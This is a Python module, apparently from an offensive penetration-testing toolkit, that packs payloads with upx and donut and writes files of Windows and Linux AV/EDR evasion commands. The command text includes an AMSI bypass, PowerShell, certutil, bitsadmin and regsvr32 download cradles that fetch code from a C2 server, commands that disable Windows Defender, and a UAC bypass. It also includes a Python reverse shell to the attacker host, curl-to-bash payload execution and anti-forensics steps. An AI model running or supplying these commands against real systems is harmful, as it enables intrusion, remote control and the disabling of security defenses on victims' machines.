"""
AV/EDR Evasion Module
Handles techniques to bypass security controls
"""

import sys
from pathlib import Path

# Add configs directory to path for config import
TOOLKIT_DIR = Path(__file__).parent.parent.parent.absolute()
sys.path.insert(0, str(TOOLKIT_DIR / "configs"))

try:
    import config
except ImportError:
    # Fallback config values if import fails
    class config:
        ATTACKER_DOMAIN = "localhost"
        C2_SERVER_URL = "http://localhost:8080"
        PAYLOAD_OUTPUT_DIR = "loot/payloads/"

from core.utils.output import print_colored

def run_av_edr_evasion(target: str, tool_executor, script_gen):
    """Execute AV/EDR evasion phase"""
    print_colored(f"🦠 Running AV/EDR Evasion for: {target}", "GREEN", True)
    print()
    
    evasion_tools = {
        "upx": {
            "command": ["upx", "--best", str(tool_executor.loot_dir / "payload.exe")],
            "description": "Executable packer"
        },
        "donut": {
            "command": ["donut", "-f", str(tool_executor.loot_dir / "payload.exe"),
                       "-o", str(tool_executor.loot_dir / "payload_donut.bin")],
            "description": "Shellcode generator"
        }
    }
    
    for tool_name, tool_config in evasion_tools.items():
        if tool_executor.check_tool(tool_name):
            print_colored(f"🔧 Running {tool_config['description']}", "BLUE")
            result = tool_executor.execute_tool(
                tool_name,
                tool_config["command"],
                timeout=120
            )
            
            if result["success"]:
                print_colored(f"✅ {tool_name} completed", "GREEN")
            else:
                print_colored(f"❌ {tool_name} failed: {result.get('error')}", "RED")
        else:
            print_colored(f"❌ {tool_name} not available", "RED")
        print()
    
    # Generate evasion techniques
    generate_evasion_scripts(script_gen)

def generate_evasion_scripts(script_gen):
    """Generate AV/EDR evasion scripts"""
    # Get config values
    attacker_domain = getattr(config, 'ATTACKER_DOMAIN', 'localhost')
    c2_server_url = getattr(config, 'C2_SERVER_URL', f'http://{attacker_domain}')
    
    evasion_content = f"""# AV/EDR Evasion Techniques

# PowerShell execution policy bypass
powershell -ExecutionPolicy Bypass -File script.ps1
powershell -c "Set-ExecutionPolicy -ExecutionPolicy Unrestricted -Scope CurrentUser"

# AMSI bypass
powershell -c "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)"

# PowerShell download cradles
powershell -c "IEX(New-Object Net.WebClient).DownloadString('{c2_server_url}/script.ps1')"
powershell -c "IEX(IWR('{c2_server_url}/script.ps1') -UseBasicParsing).Content"

# Living off the land binaries
certutil -urlcache -split -f {c2_server_url}/payload.exe payload.exe
bitsadmin /transfer myDownloadJob /download /priority normal {c2_server_url}/payload.exe C:\\temp\\payload.exe

# Process hollowing
# Use tools like ProcessHacker or custom C# code

# DLL sideloading
copy legitimate.exe C:\\temp\\
copy malicious.dll C:\\temp\\legitimate_dependency.dll

# Reflective DLL injection
powershell -c "Invoke-ReflectivePEInjection -PEPath payload.dll"

# Registry-less COM
regsvr32 /s /n /u /i:{c2_server_url}/script.sct scrobj.dll

# Fileless execution
powershell -c "$code = [System.Convert]::FromBase64String('BASE64_PAYLOAD'); [System.Reflection.Assembly]::Load($code)"

# UAC bypass
eventvwr.exe
# Replace with malicious executable in HKCU\\Software\\Classes\\mscfile\\shell\\open\\command

# Disable Windows Defender
powershell -c "Set-MpPreference -DisableRealtimeMonitoring $true"
powershell -c "Add-MpPreference -ExclusionPath 'C:\\'"
"""
    
    script_path = script_gen.safe_write("evasion_techniques.txt", evasion_content)
    if script_path:
        print_colored(f"📁 Evasion techniques script: {script_path}", "CYAN")
        
    # Add Linux-specific evasion techniques
    linux_evasion_content = f"""# Linux AV/EDR Evasion Techniques

# Reverse shell obfuscation
export RHOST="{attacker_domain}"
export RPORT="4444"
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((os.environ["RHOST"],int(os.environ["RPORT"])));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'

# Encryption wrappers
echo '#!/bin/bash' > run.sh
echo 'curl -s {c2_server_url}/payload.bin | openssl enc -aes-256-cbc -d -k "password" | bash' >> run.sh
chmod +x run.sh

# Memory-only execution
curl -s {c2_server_url}/payload.sh | bash -

# Anti-forensics
shred -zun 10 /tmp/payload
history -c
export HISTSIZE=0

# Process name hiding
exec -a "/usr/bin/apache2" bash

# Library preloading
LD_PRELOAD=/path/to/evil.so program
"""

    linux_script_path = script_gen.safe_write("linux_evasion_techniques.txt", linux_evasion_content)
    if linux_script_path:
        print_colored(f"📁 Linux evasion techniques script: {linux_script_path}", "CYAN")